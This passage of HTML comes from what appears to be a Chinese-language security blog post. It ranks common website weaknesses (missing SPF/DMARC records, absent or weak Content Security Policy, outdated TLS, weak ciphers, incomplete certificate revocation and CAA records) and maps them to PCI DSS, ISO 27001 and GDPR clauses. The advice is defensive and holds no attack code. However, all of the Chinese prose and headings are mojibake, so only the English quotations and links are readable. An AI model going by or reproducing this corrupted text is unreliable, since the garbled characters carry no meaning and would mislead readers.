æ”¹å–„è¤‡é›œåº¦ç­‰ç´šç‚ºï¼šä½è¤‡é›œåº¦é«˜é¢¨éšª</h3>\n<p>ç„¡SPF ç´€éŒ„ï¼šå»ºè­°ç‚ºç¶²åŸŸè¨­å®š SPF ç´€éŒ„</p>\n<h3 id=\"%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%B8%AD%E8%A4%87%E9%9B%9C%E5%BA%A6%E9%AB%98%E9%A2%A8%E9%9A%AA\"><a class=\"direct-link\" href=\"#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%B8%AD%E8%A4%87%E9%9B%9C%E5%BA%A6%E9%AB%98%E9%A2%A8%E9%9A%AA\">#</a> æ”¹å–„è¤‡é›œåº¦ç­‰ç´šç‚ºï¼šä¸­è¤‡é›œåº¦é«˜é¢¨éšª</h3>\n<p><strong>ç„¡ DMARC ç´€éŒ„</strong>ï¼šå»ºè­°ç‚ºç¶²åŸŸè¨­å®š DMARC ç´€éŒ„ï¼ˆå…ˆè¨­ç½® SPF èˆ‡ DKIMï¼‰</p>\n<p>ç”±æ–¼ DMARC å¿…é ˆä»°è³´ SPF èˆ‡ DKIM æ©Ÿåˆ¶æ‰èƒ½ç™¼æ®åŠŸæ•ˆï¼Œå› æ­¤å»ºè­°å…ˆæª¢æŸ¥æ˜¯å¦æœ‰ SPF è¨­ç½®éŒ¯èª¤çš„å•é¡Œï¼Œè€Œé›–ç„¶ SPF çš„æ”¹å–„è¤‡é›œåº¦ä¸¦ä¸é«˜ï¼Œä½†è¨±å¤šç¶²ç«™çš„è¨­ç½®çš†ç‚ºé è¨­ï¼Œå› æ­¤å»ºè­°æŒ‰ç…§ä¸Šä¸€ç¯‡æ–‡ç« çš„åˆæ­¥æª¢è¦–ä¹‹å¾Œï¼Œå¯ä»¥å°‡ SPF çš„æ”¹å–„åˆ—ç‚ºå„ªå…ˆé …ç›®ã€‚</p>\n<p>æ­¤å¤–ï¼Œé›–ç„¶ DMARC çš„æ”¹å–„è¤‡é›œåº¦ä¸ä½ï¼Œä½†æ­¤é …ç›®å°æ–¼é˜²ç¯„ç¤¾äº¤å·¥ç¨‹ä¾†èªªæ•ˆæœååˆ†é¡¯è‘—ï¼Œæ‰€ä»¥è‹¥é‡å°ç¤¾äº¤å·¥ç¨‹æœ‰ç–‘æ…®çš„æœ‹å‹ï¼Œä¸å¦¨åœ¨ SPF è¨­ç½®å®Œæˆä¹‹å¾Œï¼Œåƒè€ƒé¢¨éšªä¿®å¾©åƒè€ƒè³‡æ–™å° DMARC é€²è¡Œè¨­ç½®ã€‚</p>\n<h3 id=\"%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A-2\"><a class=\"direct-link\" href=\"#%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A-2\">#</a> é¢¨éšªä¿®å¾©åƒè€ƒè³‡æ–™ï¼š</h3>\n<p><strong>SPFï¼š</strong></p>\n<p><a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf/\"><strong>é—œæ–¼ email security çš„å¤§å°äº‹â€Šâ€”â€Šè¨­å®šç¯‡ SPF</strong><br>\n</a></p>\n<p><strong>DMARC &amp; DKIMï¼š</strong></p>\n<p><a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc/\"><strong>é—œæ–¼ email security çš„å¤§å°äº‹â€Šâ€”â€Šè¨­å®šç¯‡ DKIMã€DMARC</strong></a></p>\n<h2 id=\"%E2%84%96%EF%BC%92csp-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\"><a class=\"direct-link\" href=\"#%E2%84%96%EF%BC%92csp-%E6%9C%AA%E8%A8%AD%E7%BD%AE%E6%88%96%E5%AE%89%E5%85%A8%E7%AD%89%E7%B4%9A%E4%B8%8D%E8%B6%B3\">#</a> â„–ï¼’CSP æœªè¨­ç½®æˆ–å®‰å…¨ç­‰ç´šä¸è¶³</h2>\n<p>æ’åç¬¬äºŒçš„CSP æœªè¨­ç½®æˆ–å®‰å…¨ç­‰ç´šä¸è¶³ï¼Œåœ¨é€™å€‹é …ç›®è£¡æœ‰å°‡è¿‘ 90% çš„ç¶²ç«™CSP æœªè¨­ç½®æˆ–å®‰å…¨ç­‰ç´šä¸è¶³ï¼Œ<strong>ç¶²é å…§å®¹å®‰å…¨æ”¿ç­–</strong>ï¼ˆ Content Security Policy, CSPï¼‰ä¸»è¦æ˜¯ç‚ºäº†é˜²ç¯„ <strong>XSSï¼ˆè·¨ç«™è…³æœ¬æ”»æ“Šï¼‰</strong>ï¼Œä»¥å‘ŠçŸ¥ç€è¦½å™¨ç™¼å‡ºçš„ Request ä½ç½®æ˜¯å¦å—åˆ°ä¿¡ä»»ä¾†é˜»æ“‹éé æœŸçš„å°å¤–é€£ç·šï¼ŒåŠ å¼·ç¶²ç«™å®‰å…¨æ€§ï¼Œåœ¨ http header å®šç¾©é™åˆ¶è¼‰å…¥çš„è·¨ç«™ script åƒæ˜¯ img-srcã€script-srcâ€¦ç­‰é€™äº›å¯ä»¥è¼‰å…¥å¤–éƒ¨è³‡æºçš„æ¨™ç±¤ã€‚</p>\n<h3 id=\"%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA\"><a class=\"direct-link\" href=\"#%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA\">#</a> <strong>ä½è¤‡é›œåº¦ä¸­é¢¨éšª</strong></h3>\n<p><strong>CSPæœªè¨­å®šæˆ–å®‰å…¨ç­‰ç´šä¸è¶³</strong>ï¼šå»ºè­°ç‚ºé¿å…æ­¤é¢¨éšªå¯æ–¼ HTTP Headers ä¸­è¨­ç½® Content-Security-Policyã€‚</p>\n<p>æ­¤é …ç›®çš„æ”¹å–„è¤‡é›œåº¦ä¸é«˜ï¼Œå»ºè­°å¯ä»¥åœ¨ Cookie çš„ä¸‰é …åŸºæœ¬è¨­å®šä»¥åŠ X-Frame-Options å®Œæˆå¾Œå°æ­¤é …ç›®é€²è¡Œè¨­ç½®ã€‚</p>\n<h3 id=\"%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A-3\"><a class=\"direct-link\" href=\"#%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A-3\">#</a> å¸¸è¦‹é¢¨éšªå°æ‡‰æ³•è¦æŠ€è¡“é¢é …ç›®ï¼š</h3>\n<p><strong>PCIDSS</strong> ï¼šDevelop and maintain secure systems and applications</p>\n<h3 id=\"%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-3\"><a class=\"direct-link\" href=\"#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-3\">#</a> ç´°é …èªªæ˜ï¼š</h3>\n<blockquote>\n<p>6.5.1: Protected from injection flaws, particularly SQL injection. Also consider OS Command Injection, LDAP and XPath injection flaws as well as other injection flaws.</p>\n</blockquote>\n<blockquote>\n<p>6.5.7: Protect all web applications and application interfaces from cross-site scripting (XSS).</p>\n</blockquote>\n<h3 id=\"%E6%87%B6%E4%BA%BA%E5%8C%85%EF%BC%9A%E9%99%A4%E4%BA%86%E9%98%B2%E7%AF%84%E5%8F%AF%E8%83%BD%E5%B0%8E%E8%87%B4%E5%85%A7%E5%B5%8C%E6%88%96%E6%98%AF%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%BB%E6%93%8A%EF%BC%8C%E9%87%9D%E5%B0%8D-xss-%E7%9A%84%E6%94%BB%E6%93%8A%E9%9C%80%E8%A6%81%E7%89%B9%E5%88%A5%E6%B3%A8%E6%84%8F%E3%80%82\"><a class=\"direct-link\" href=\"#%E6%87%B6%E4%BA%BA%E5%8C%85%EF%BC%9A%E9%99%A4%E4%BA%86%E9%98%B2%E7%AF%84%E5%8F%AF%E8%83%BD%E5%B0%8E%E8%87%B4%E5%85%A7%E5%B5%8C%E6%88%96%E6%98%AF%E6%B3%A8%E5%85%A5%E7%9A%84%E6%94%BB%E6%93%8A%EF%BC%8C%E9%87%9D%E5%B0%8D-xss-%E7%9A%84%E6%94%BB%E6%93%8A%E9%9C%80%E8%A6%81%E7%89%B9%E5%88%A5%E6%B3%A8%E6%84%8F%E3%80%82\">#</a> <strong>æ‡¶äººåŒ…ï¼šé™¤äº†é˜²ç¯„å¯èƒ½å°è‡´å…§åµŒæˆ–æ˜¯æ³¨å…¥çš„æ”»æ“Šï¼Œé‡å° XSS çš„æ”»æ“Šéœ€è¦ç‰¹åˆ¥æ³¨æ„ã€‚</strong></h3>\n<h3 id=\"%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A-3\"><a class=\"direct-link\" href=\"#%E9%A2%A8%E9%9A%AA%E4%BF%AE%E5%BE%A9%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99%EF%BC%9A-3\">#</a> <strong>é¢¨éšªä¿®å¾©åƒè€ƒè³‡æ–™ï¼š</strong></h3>\n<p><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP\"><strong>Content Security Policy (CSP) - HTTP | MDN</strong><br>\n</a></p>\n<h2 id=\"%E2%84%96%EF%BC%91%E7%B6%B2%E7%AB%99%E6%86%91%E8%AD%89%E5%AE%8C%E6%95%B4%E6%80%A7%E4%B8%8D%E8%B6%B3\"><a class=\"direct-link\" href=\"#%E2%84%96%EF%BC%91%E7%B6%B2%E7%AB%99%E6%86%91%E8%AD%89%E5%AE%8C%E6%95%B4%E6%80%A7%E4%B8%8D%E8%B6%B3\">#</a> â„–ï¼‘ç¶²ç«™æ†‘è­‰å®Œæ•´æ€§ä¸è¶³</h2>\n<p>æ’åç¬¬ä¸€çš„ç¶²ç«™æ†‘è­‰å®Œæ•´æ€§ä¸è¶³ï¼Œåœ¨é€™å€‹é …ç›®è£¡æœ‰ 90% çš„å®Œæ•´æ€§ä¸è¶³ä¾‹å¦‚<strong>æ†‘è­‰æ’¤éŠ·æ©Ÿåˆ¶æœªè¨­å®šå®Œæ•´</strong>æˆ–<strong>æ†‘è­‰æˆæ¬Šæ©Ÿé—œè³‡æºç´€éŒ„æª¢æŸ¥</strong>ï¼Œåœ¨æ²’æœ‰é€™äº›è¨­å®šçš„æƒ…æ³ä¸‹æ¥­è€…å¾ˆé›£é˜²å µä»»æ„æ•¸ä½æ†‘è­‰èªè­‰æ©Ÿæ§‹æ“…è‡ªç°½ç½²ç¶²åŸŸæ†‘è­‰ï¼Œè€Œæ†‘è­‰å®Œæ•´æ€§ä¸è¶³çš„æ¥­è€…ä¸­é‚„åŒ…å«äº†<strong>ä½¿ç”¨ä¸å®‰å…¨çš„åŠ å¯†</strong>åŠ<strong>éæœŸæ†‘è­‰</strong>èˆ‡<strong>éèˆŠçš„ SSL/TLS å”è­°</strong>ï¼Œä»¥ä¸Šå•é¡Œå¢åŠ äº†æ¥­è€…åœ¨æ†‘è­‰å±¤é¢å¯èƒ½ç™¼ç”Ÿè³‡å®‰äº‹ä»¶çš„é¢¨éšªæ©Ÿç‡ã€‚</p>\n<h3 id=\"%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E9%AB%98%E9%A2%A8%E9%9A%AA-2\"><a class=\"direct-link\" href=\"#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E9%AB%98%E9%A2%A8%E9%9A%AA-2\">#</a> æ”¹å–„è¤‡é›œåº¦ç­‰ç´šç‚ºï¼šä½è¤‡é›œåº¦é«˜é¢¨éšª</h3>\n<p><strong>SSL/TLS å”è­°éèˆŠ</strong>ï¼šå»ºè­°åœç”¨å¦‚ TLS 1.1 ç­‰éèˆŠå”è­°ã€‚</p>\n<h3 id=\"%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA-3\"><a class=\"direct-link\" href=\"#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%BD%8E%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA-3\">#</a> æ”¹å–„è¤‡é›œåº¦ç­‰ç´šç‚ºï¼šä½è¤‡é›œåº¦ä¸­é¢¨éšª</h3>\n<p><strong>ä½¿ç”¨ä¸å®‰å…¨çš„åŠ å¯†æ³•</strong>ï¼šå»ºè­°åœ¨ä¼ºæœå™¨è¨­å®šä¸­åœç”¨æ­¤åŠ å¯†å¥—ä»¶</p>\n<h3 id=\"%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%B8%AD%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA\"><a class=\"direct-link\" href=\"#%E6%94%B9%E5%96%84%E8%A4%87%E9%9B%9C%E5%BA%A6%E7%AD%89%E7%B4%9A%E7%82%BA%EF%BC%9A%E4%B8%AD%E8%A4%87%E9%9B%9C%E5%BA%A6%E4%B8%AD%E9%A2%A8%E9%9A%AA\">#</a> æ”¹å–„è¤‡é›œåº¦ç­‰ç´šç‚ºï¼šä¸­è¤‡é›œåº¦ä¸­é¢¨éšª</h3>\n<p><strong>æ†‘è­‰æ’¤éŠ·æ©Ÿåˆ¶æœªè¨­å®šå®Œæ•´</strong>ï¼šå»ºè­°ä¾æ“šä¼ºæœå™¨è¨­å®šï¼Œä½¿ç”¨åŠ å¯†å¥—ä»¶å®Œæ•´æ­¤åŠŸèƒ½</p>\n<p><strong>æ†‘è­‰æˆæ¬Šæ©Ÿé—œè³‡æºè¨˜éŒ„æª¢æŸ¥</strong>ï¼šå»ºè­°ç‚ºç¶²åŸŸè¨­å®š CAA RR</p>\n<p><strong>æ†‘è­‰éæœŸ</strong>ï¼šå»ºè­°è¯ç¹« CA æ›´æ–°æ†‘è­‰</p>\n<p>æ™®éç¶²ç«™åœ¨æ†‘è­‰ç›¸é—œçš„è¨­ç½®ä¸Šè¼ƒå®¹æ˜“æœ‰ç–æ¼ï¼Œå»ºè­°å„ªå…ˆæª¢è¦–å”è­°éèˆŠä»¥åŠæ˜¯å¦ä½¿ç”¨ä¸å®‰å…¨çš„åŠ å¯†æ³•ï¼Œä¹Ÿå› ç‚ºé€™å…©é …çš„åˆæ­¥æª¢è¦–è¼ƒç‚ºå®¹æ˜“ï¼Œæ‰€ä»¥å»ºè­°åœ¨æ†‘è­‰çš„é¡åˆ¥ä¸­ï¼Œå°‡é€™å…©é …é€²è¡Œå„ªå…ˆä¿®å¾©ï¼Œè€Œæ”¹å–„è¤‡é›œåº¦ç‚ºä¸­çš„ä¸‰é …æ†‘è­‰è¨­ç½®ï¼Œç”±æ–¼æª¢è¦–æ–¹å¼ä»¥åŠæ”¹å–„è¤‡é›œåº¦è¼ƒé«˜ï¼Œå› æ­¤å¯ä»¥è©•ä¼°é€™ä¸‰é …æ†‘è­‰é …ç›®çš„å¿…è¦æ€§ï¼Œå„ªå…ˆä¿®å¾©å…¶é¤˜ä¸­è¤‡é›œåº¦ä¸­é¢¨éšªé …ç›®ï¼Œä½†å› ç‚ºæ†‘è­‰èˆ‡è³‡æ–™çš„åŠ å¯†å’Œä¿è­·æ¯æ¯ç›¸é—œï¼Œæ‰€ä»¥èˆ‡ä¹‹ç›¸é—œè¯çš„æ³•è¦é …ç›®ä¹Ÿç‰¹åˆ¥å¤šï¼Œæ‰€ä»¥å¦‚æœå¾ˆåœ¨æ„æ³•éµçš„æœ‹å‹å»ºè­°é‚„æ˜¯å°‡æ†‘è­‰é …ç›®çš„é¢¨éšªä¿®å¾©é †åºæé«˜ä¸€å€‹å±¤ç´šã€‚</p>\n<h3 id=\"%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A-4\"><a class=\"direct-link\" href=\"#%E5%B8%B8%E8%A6%8B%E9%A2%A8%E9%9A%AA%E5%B0%8D%E6%87%89%E6%B3%95%E8%A6%8F%E6%8A%80%E8%A1%93%E9%9D%A2%E9%A0%85%E7%9B%AE%EF%BC%9A-4\">#</a> å¸¸è¦‹é¢¨éšªå°æ‡‰æ³•è¦æŠ€è¡“é¢é …ç›®ï¼š</h3>\n<p><strong>æ†‘è­‰æ’¤éŠ·æ©Ÿåˆ¶æœªè¨­å®šå®Œæ•´ã€ä¸å®‰å…¨åŠ å¯†å¥—ä»¶ã€æ†‘è­‰éæœŸ</strong></p>\n<p><strong>PCIDSS</strong> ï¼š</p>\n<p>Encrypt transmission of cardholder data across openï¼Œpublic networks</p>\n<h3 id=\"%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-4\"><a class=\"direct-link\" href=\"#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-4\">#</a> ç´°é …èªªæ˜ï¼š</h3>\n<blockquote>\n<p>1: Use strong cryptography and security protocols to safeguard sensitive cardholder data during transmission over open, public networks.</p>\n</blockquote>\n<blockquote>\n<p>1.1: Ensure wireless networks transmitting cardholder data, or connected to the cardholder data environment, use industry best practices to implement strong encryption for authentication and transmission.</p>\n</blockquote>\n<p>Develop and maintain secure systems and applications</p>\n<h3 id=\"%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-5\"><a class=\"direct-link\" href=\"#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-5\">#</a> ç´°é …èªªæ˜ï¼š</h3>\n<blockquote>\n<p>6.5.4: Do not allow insecure communications.</p>\n</blockquote>\n<h3 id=\"%E6%87%B6%E4%BA%BA%E5%8C%85%E4%B9%8B-pcidss%EF%BC%9A%E9%99%A4%E4%BA%86%E4%B8%8D%E5%85%81%E8%A8%B1%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%80%9A%E8%A8%8A%E4%BB%A5%E5%A4%96%EF%BC%8C%E4%B9%9F%E9%9C%80%E8%A6%81%E4%BD%BF%E7%94%A8%E5%BC%B7%E5%8A%A0%E5%AF%86%E5%92%8C%E5%AE%89%E5%85%A8%E5%8D%94%E8%AD%B0%E4%BE%86%E4%BF%9D%E8%AD%B7%E6%95%8F%E6%84%9F%E6%95%B8%E6%93%9A%E3%80%82\"><a class=\"direct-link\" href=\"#%E6%87%B6%E4%BA%BA%E5%8C%85%E4%B9%8B-pcidss%EF%BC%9A%E9%99%A4%E4%BA%86%E4%B8%8D%E5%85%81%E8%A8%B1%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%80%9A%E8%A8%8A%E4%BB%A5%E5%A4%96%EF%BC%8C%E4%B9%9F%E9%9C%80%E8%A6%81%E4%BD%BF%E7%94%A8%E5%BC%B7%E5%8A%A0%E5%AF%86%E5%92%8C%E5%AE%89%E5%85%A8%E5%8D%94%E8%AD%B0%E4%BE%86%E4%BF%9D%E8%AD%B7%E6%95%8F%E6%84%9F%E6%95%B8%E6%93%9A%E3%80%82\">#</a> <strong>æ‡¶äººåŒ…ä¹‹ PCIDSS</strong>ï¼šé™¤äº†ä¸å…è¨±ä¸å®‰å…¨çš„é€šè¨Šä»¥å¤–ï¼Œä¹Ÿéœ€è¦ä½¿ç”¨å¼·åŠ å¯†å’Œå®‰å…¨å”è­°ä¾†ä¿è­·æ•æ„Ÿæ•¸æ“šã€‚</h3>\n<p><strong>ISO27001ï¼š</strong></p>\n<p>Cryptographic Controls</p>\n<h3 id=\"%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-6\"><a class=\"direct-link\" href=\"#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-6\">#</a> ç´°é …èªªæ˜ï¼š</h3>\n<blockquote>\n<p>Encryption and cryptographic controls are often seen as one of the key weapons in the security arsenal, however, on its own it is not the â€œsilver bulletâ€ that solves every problem. Incorrect selection of cryptographic technologies and techniques or the poor management of cryptographic material (e.g. keys and certificates) can create vulnerabilities themselves.</p>\n</blockquote>\n<h3 id=\"%E6%87%B6%E4%BA%BA%E5%8C%85%E4%B9%8B-iso27001%EF%BC%9A%E5%8A%A0%E5%AF%86%E6%8A%80%E8%A1%93%E7%9A%84%E9%81%B8%E6%93%87%E9%8C%AF%E8%AA%A4%E6%88%96%E5%8A%A0%E5%AF%86%E7%B4%A0%E6%9D%90%EF%BC%88%E4%BE%8B%E5%A6%82%E5%AF%86%E9%91%B0%E5%92%8C%E8%AD%89%E6%9B%B8%EF%BC%89%E7%9A%84%E7%AE%A1%E7%90%86%E4%B8%8D%E5%96%84%E5%8F%AF%E8%83%BD%E6%9C%83%E5%B0%8E%E8%87%B4%E6%9C%8D%E5%8B%99%E7%94%A2%E7%94%9F%E6%BC%8F%E6%B4%9E%E3%80%82\"><a class=\"direct-link\" href=\"#%E6%87%B6%E4%BA%BA%E5%8C%85%E4%B9%8B-iso27001%EF%BC%9A%E5%8A%A0%E5%AF%86%E6%8A%80%E8%A1%93%E7%9A%84%E9%81%B8%E6%93%87%E9%8C%AF%E8%AA%A4%E6%88%96%E5%8A%A0%E5%AF%86%E7%B4%A0%E6%9D%90%EF%BC%88%E4%BE%8B%E5%A6%82%E5%AF%86%E9%91%B0%E5%92%8C%E8%AD%89%E6%9B%B8%EF%BC%89%E7%9A%84%E7%AE%A1%E7%90%86%E4%B8%8D%E5%96%84%E5%8F%AF%E8%83%BD%E6%9C%83%E5%B0%8E%E8%87%B4%E6%9C%8D%E5%8B%99%E7%94%A2%E7%94%9F%E6%BC%8F%E6%B4%9E%E3%80%82\">#</a> <strong>æ‡¶äººåŒ…ä¹‹ ISO27001</strong>ï¼šåŠ å¯†æŠ€è¡“çš„é¸æ“‡éŒ¯èª¤æˆ–åŠ å¯†ç´ æï¼ˆä¾‹å¦‚å¯†é‘°å’Œè­‰æ›¸ï¼‰çš„ç®¡ç†ä¸å–„å¯èƒ½æœƒå°è‡´æœå‹™ç”¢ç”Ÿæ¼æ´ã€‚</h3>\n<p><strong>GDPRï¼š</strong></p>\n<p>Responsibility of the controller</p>\n<h3 id=\"%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-7\"><a class=\"direct-link\" href=\"#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-7\">#</a> ç´°é …èªªæ˜ï¼š</h3>\n<blockquote>\n<p>Taking into account the nature, scope, context and purposes of processing as well as the risks of varying likelihood and severity for the rights and freedoms of natural persons, the controller shall implement appropriate technical and organisational measures to ensure and to be able to demonstrate that processing is performed in accordance with this Regulation. 2Those measures shall be reviewed and updated where necessary.</p>\n</blockquote>\n<blockquote>\n<p>Where proportionate in relation to processing activities, the measures referred to in paragraph 1 shall include the implementation of appropriate data protection policies by the controller.</p>\n</blockquote>\n<blockquote>\n<p>Adherence to approved codes of conduct as referred to in <a href=\"https://gdpr-info.eu/art-40-gdpr/\">Article 40</a> or approved certification mechanisms as referred to in <a href=\"https://gdpr-info.eu/art-42-gdpr/\">Article 42</a> may be used as an element by which to demonstrate compliance with the obligations of the controller.</p>\n</blockquote>\n<p>Data protection by design and by default</p>\n<h3 id=\"%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-8\"><a class=\"direct-link\" href=\"#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-8\">#</a> ç´°é …èªªæ˜ï¼š</h3>\n<blockquote>\n<p>Taking into account the state of the art, the cost of implementation and the nature, scope, context and purposes of processing as well as the risks of varying likelihood and severity for rights and freedoms of natural persons posed by the processing, the controller shall, both at the time of the determination of the means for processing and at the time of the processing itself, implement appropriate technical and organisational measures, such as pseudonymisation, which are designed to implement data-protection principles, such as data minimisation, in an effective manner and to integrate the necessary safeguards into the processing in order to meet the requirements of this Regulation and protect the rights of data subjects.</p>\n</blockquote>\n<blockquote>\n<p>The controller shall implement appropriate technical and organisational measures for ensuring that, by default, only personal data which are necessary for each specific purpose of the processing are processed. 2That obligation applies to the amount of personal data collected, the extent of their processing, the period of their storage and their accessibility. 3In particular, such measures shall ensure that by default personal data are not made accessible without the individualâ€™s intervention to an indefinite number of natural persons.</p>\n</blockquote>\n<blockquote>\n<p>An approved certification mechanism pursuant to <a href=\"https://gdpr-info.eu/art-42-gdpr/\">Article 42</a> may be used as an element to demonstrate compliance with the requirements set out in paragraphs 1 and 2 of this Article.</p>\n</blockquote>\n<p>Security of processing</p>\n<h3 id=\"%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-9\"><a class=\"direct-link\" href=\"#%E7%B4%B0%E9%A0%85%E8%AA%AA%E6%98%8E%EF%BC%9A-9\">#</a> ç´°é …èªªæ˜ï¼š</h3>\n<blockquote>\n<p>Taking into account the state of the art, the costs of implementation and the nature, scope, context and purposes of processing as well as the risk of varying likelihood and severity for the rights and freedoms of natural persons, the controller and the processor shall implement appropriate technical and organisational measures to ensure a level of security appropriate to the risk, including inter alia as appropriate:</p>\n</blockquote>\n<blockquote>\n<p>1.the pseudonymisation and encryption of personal data;</p>\n</blockquote>\n<blockquote>\n<p>2.the ability to ensure the ongoing confidentiality, integrity, availability and resilience of processing systems and services;</p>\n</blockquote>\n<blockquote>\n<p>3.the ability to restore the availability and access to personal data in a timely manner in the event of a physical or technical incident;</p>\n</blockquote>\n<blockquote>\n<p>4.a process for regularly testing, assessing and evaluating the effectiveness of technical and organisational measures for ensuring the security of the processing.</p>\n</blockquote>\n<blockquote>\n<p>In assessing the appropriate level of security account shall be taken in particular of the risks that are presented by processing, in particular from accidental or unlawful destruction, loss, alteration, unauthorised disclosure of, or access to personal data transmitted, stored or otherwise processed.</p>\n</blockquote>\n<blockquote>\n<p>Adherence to an approved code of conduct as referred to in <a href=\"https://gdpr-info.eu/art-40-gdpr/\">Article 40</a> or an approved certification mechanism as referred to in <a href=\"https://gdpr-info.eu/art-42-gdpr/\">Article 42</a> may be used as an element by which to demonstrate compliance with the requirements set out in paragraph 1 of this Article.</p>\n</blockquote>\n<blockquote>\n<p>The controller and processor shall take steps to ensure that any natural person acting under the authority of the controller or the processor who has access to personal data does not process them except on instructions from the controller, unless he or she is required to do so by Union or Member State law.</p>\n</blockquote>\n<h3 id=\"%E6%87%B6%E4%BA%BA%E5%8C%85%E4%B9%8B-gdpr-%EF%BC%9A%E6%8E%A7%E5%88%B6%E8%80%85%E6%87%89%E5%AF%A6%E6%96%BD%E9%81%A9%E7%95%B6%E7%9A%84%E6%95%B8%E6%93%9A%E4%BF%9D%E8%AD%B7%E6%94%BF%E7%AD%96%E5%92%8C%E6%95%B8%E6%93%9A%E4%BF%9D%E8%AD%B7%E5%8E%9F%E5%89%87%EF%BC%8C%E4%BE%8B%E5%A6%82%E5%B0%87%E5%BF%85%E8%A6%81%E7%9A%84%E4%BF%9D%E8%AD%B7%E6%8E%AA%E6%96%BD%E6%95%B4%E5%90%88%E5%88%B0%E8%B3%87%E6%96%99%E8%99%95%E7%90%86%E9%81%8E%E7%A8%8B%E4%B8%AD%EF%BC%8C%E4%B9%9F%E9%9C%80%E7%A2%BA%E4%BF%9D%E8%99%95%E7%90%86%E6%95%B8%E6%93%9A%E7%9A%84%E7%B3%BB%E7%B5%B1%E5%92%8C%E6%9C%8D%E5%8B%99%E6%A9%9F%E5%AF%86%E6%80%A7%E3%80%81%E5%AE%8C%E6%95%B4%E6%80%A7%E3%80%81%E5%8F%AF%E7%94%A8%E6%80%A7%EF%BC%8C%E9%81%BF%E5%85%8D%E6%9C%AA%E7%B6%93%E6%8E%88%E6%AC%8A%E8%80%8C%E6%8F%AD%E9%9C%B2%E7%9A%84%E5%80%8B%E4%BA%BA%E6%95%B8%E6%93%9A%E3%80%82\"><a class=\"direct-link\" 